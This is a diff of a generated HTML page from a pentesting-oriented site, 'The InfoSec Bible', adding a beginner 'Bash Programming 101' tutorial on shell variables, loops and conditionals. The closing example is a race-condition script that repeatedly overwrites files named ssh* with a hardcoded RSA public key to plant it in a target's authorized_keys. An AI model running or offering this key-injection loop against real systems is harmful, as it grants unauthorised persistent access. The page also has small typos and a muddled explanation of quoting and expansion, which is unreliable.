@@ -6,7 +6,7 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
 
-    <title>Linux Tutorials &#8212; The InfoSec Bible</title>
+    <title>Bash Programming 101 &#8212; The InfoSec Bible</title>
     
   <link href="../_static/css/theme.css" rel="stylesheet">
   <link href="../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">
@@ -52,8 +52,8 @@
     <script async="async" src="../_static/sphinx-thebe.js"></script>
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
-    <link rel="next" title="Linux 101" href="101.html" />
-    <link rel="prev" title="PowerShell for Pentesters" href="../windows/powershell101.html" />
+    <link rel="next" title="Linux Privilege Escalation" href="privesc.html" />
+    <link rel="prev" title="Linux 101" href="101.html" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="docsearch:language" content="None">
     
@@ -138,7 +138,7 @@
 </p>
 <ul class="current nav bd-sidenav">
  <li class="toctree-l1 current active has-children">
-  <a class="current reference internal" href="#">
+  <a class="reference internal" href="index.html">
    Linux Tutorials
   </a>
   <input checked="" class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
@@ -146,14 +146,14 @@
    <i class="fas fa-chevron-down">
    </i>
   </label>
-  <ul>
+  <ul class="current">
    <li class="toctree-l2">
     <a class="reference internal" href="101.html">
      Linux 101
     </a>
    </li>
-   <li class="toctree-l2">
-    <a class="reference internal" href="bash101.html">
+   <li class="toctree-l2 current active">
+    <a class="current reference internal" href="#">
      Bash Programming 101
     </a>
    </li>
@@ -321,7 +321,7 @@
         <!-- ipynb file if we had a myst markdown file -->
         
         <!-- Download raw file -->
-        <a class="dropdown-buttons" href="../_sources/linux/index.md"><button type="button"
+        <a class="dropdown-buttons" href="../_sources/linux/bash101.md"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                 data-placement="left">.md</button></a>
         <!-- Download PDF via print -->
@@ -341,7 +341,7 @@
                 data-toggle="tooltip" data-placement="left" title="Source repository"><i
                     class="fab fa-github"></i>repository</button></a>
         <a class="issues-button"
-            href="https://github.com/executablebooks/jupyter-book/issues/new?title=Issue%20on%20page%20%2Flinux/index.html&body=Your%20issue%20content%20here."><button
+            href="https://github.com/executablebooks/jupyter-book/issues/new?title=Issue%20on%20page%20%2Flinux/bash101.html&body=Your%20issue%20content%20here."><button
                 type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                 title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
         
@@ -362,6 +362,29 @@
         <!-- Table of contents -->
         <div class="d-none d-md-block col-md-2 bd-toc show">
             
+            <div class="tocsection onthispage pt-5 pb-3">
+                <i class="fas fa-list"></i> Contents
+            </div>
+            <nav id="bd-toc-nav" aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#bash-101">
+   Bash 101
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#variables">
+   Variables
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#loops">
+   Loops
+  </a>
+ </li>
+</ul>
+
+            </nav>
         </div>
     </div>
 </div>
@@ -370,10 +393,76 @@
         
               <div>
                 
-  <section class="tex2jax_ignore mathjax_ignore" id="linux-tutorials">
-<h1>Linux Tutorials<a class="headerlink" href="#linux-tutorials" title="Permalink to this headline">¶</a></h1>
-<div class="toctree-wrapper compound">
+  <section class="tex2jax_ignore mathjax_ignore" id="bash-programming-101">
+<h1>Bash Programming 101<a class="headerlink" href="#bash-programming-101" title="Permalink to this headline">¶</a></h1>
+<section id="bash-101">
+<h2>Bash 101<a class="headerlink" href="#bash-101" title="Permalink to this headline">¶</a></h2>
+<p>First we need to quickly define what a “shell” is, and we can do that thanks to Wikipedia:</p>
+<blockquote>
+<div><p>In computing, a shell is a computer program which exposes an operating system’s services to a human user or other program</p>
+</div></blockquote>
+<p>With that in mind, Bash is the default shell for most Linux operating systems. Bash is actually an ackronym that stands for Bourne Again Shell.</p>
+<p>However it’s much more than just a way to type commands into a computer, it’s a complete programming language (that’s a technically correct statement as Bash is a “Turing Complete” language) that can perform some pretty cool feats of automation and system administration.</p>
+<p>It’s also our bread and butter when we’re dealing with a Linux system, so learn to love it, because it’s going nowhere fast!</p>
+</section>
+<section id="variables">
+<h2>Variables<a class="headerlink" href="#variables" title="Permalink to this headline">¶</a></h2>
+<p>A variable in Bash is pretty much the same as a variable in any other language, it’s a name and then a value:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">MY_VARIABLE</span><span class="o">=</span><span class="s1">&#39;something&#39;</span>
+</pre></div>
 </div>
+<p>The above assigns the string <code class="docutils literal notranslate"><span class="pre">something</span></code> to our awesome variable.</p>
+<p>The catch with Bash is that there can’t be any white space between the name, the equals symbol, and the value. Bash doesn’t like white space! Deal with it!</p>
+<p>To call the variable we just made we can just type:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$MY_VARIABLE</span>
+</pre></div>
+</div>
+<p>But wait! We got an error?</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>-bash: something: <span class="nb">command</span> not found
+</pre></div>
+</div>
+<p>That’s because we assigned a string, and not a command. By default Bash will try and “expand” whatever is inside quotes unless you tell it to do something different. This can actually lead to an interesting and common vulnerability whereby a system variable is replaced by an attacker, then when an application calls the variable some malicious code will run.</p>
+<p>To see the contents of our variable we can just use <code class="docutils literal notranslate"><span class="pre">echo</span></code>:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="nv">$MY_VARIBLE</span>
+</pre></div>
+</div>
+</section>
+<hr class="docutils" />
+<section id="loops">
+<h2>Loops<a class="headerlink" href="#loops" title="Permalink to this headline">¶</a></h2>
+<p>We have three main types of loops of conditional statements that we can run in <code class="docutils literal notranslate"><span class="pre">bash</span></code></p>
+<p>While Loops</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
+	<span class="o">(</span>code goes here<span class="o">)</span>
+<span class="k">done</span>
+</pre></div>
+</div>
+<p>For Loops</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="k">for</span> f in <span class="k">$(</span><span class="nb">command</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+	<span class="o">(</span>code goes here<span class="o">)</span>
+<span class="k">done</span>
+</pre></div>
+</div>
+<p>If Statements</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">[[</span> expression <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+	<span class="o">(</span>code goes here<span class="o">)</span>
+<span class="k">fi</span>
+</pre></div>
+</div>
+<p>These can all be chained as long as we remember to close them all off:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+
+<span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
+    <span class="k">for</span> file in <span class="k">$(</span>ls<span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+        <span class="k">if</span> <span class="o">[[</span> <span class="nv">$file</span> <span class="o">==</span> ssh* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+            <span class="nb">echo</span> <span class="s2">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCs5XQo8LwC6J8sc1EPiABH5pmyNwLoZzKcbjNBP8eU/k/nA7nriJA5vUq+YJVAgoDiDocbHLR9SBx03imGxCNOpHdOpgMQs+DGmNLPVcy9v9Uctg5nVU11FWz1XLcn8aimypnL3xHexB219EzkVtZx0GkgDQS2pnHutypX9sIm9tient4/dRz4btt5p7MoPmtsx4oQEMEYzzeyRKOBs+10UzOw2oHQveDZ9kBWFPjiU0km5qoBuOSecQlhjB9FWWwvHRJIFMgOwwib5WiArDfq1y1plHMNQA/3aKYenYWKmLhG15aVWs3l2MATEP/7h0FbeHsKV6+Ap3LqVBXW5zjORa6KXM5YZk2R7aBqRQNE8r/qh4FZRDaRCrVHFhmWPQvCDmzP59OkNDW9v6NHjPOSisTwxEKND1SWbxjJh19YywyWDTyXcMHCOiSVdtP3BsnAc3M2dV0GsRJWCheDwt21mGnx9ibYbP14iY/GMmk/vcpmvPHlJidsicQ86R0dNpU=&quot;</span> &gt; <span class="nv">$file</span>
+            <span class="k">fi</span>
+        <span class="k">done</span>
+    <span class="k">done</span>
+</pre></div>
+</div>
+<p>(The above code was written to cause a race condition with another script running on the system that would cause the public key (as included above) to be injected into the <code class="docutils literal notranslate"><span class="pre">authorized_keys</span></code> file on a target machine)</p>
+</section>
 </section>
 
     <script type="text/x-thebe-config">
@@ -401,17 +490,17 @@
         
             <!-- Previous / next buttons -->
 <div class='prev-next-area'> 
-    <a class='left-prev' id="prev-link" href="../windows/powershell101.html" title="previous page">
+    <a class='left-prev' id="prev-link" href="101.html" title="previous page">
         <i class="fas fa-angle-left"></i>
         <div class="prev-next-info">
             <p class="prev-next-subtitle">previous</p>
-            <p class="prev-next-title">PowerShell for Pentesters</p>
+            <p class="prev-next-title">Linux 101</p>
         </div>
     </a>
-    <a class='right-next' id="next-link" href="101.html" title="next page">
+    <a class='right-next' id="next-link" href="privesc.html" title="next page">
     <div class="prev-next-info">
         <p class="prev-next-subtitle">next</p>
-        <p class="prev-next-title">Linux 101</p>
+        <p class="prev-next-title">Linux Privilege Escalation</p>
     </div>
     <i class="fas fa-angle-right"></i>
     </a>
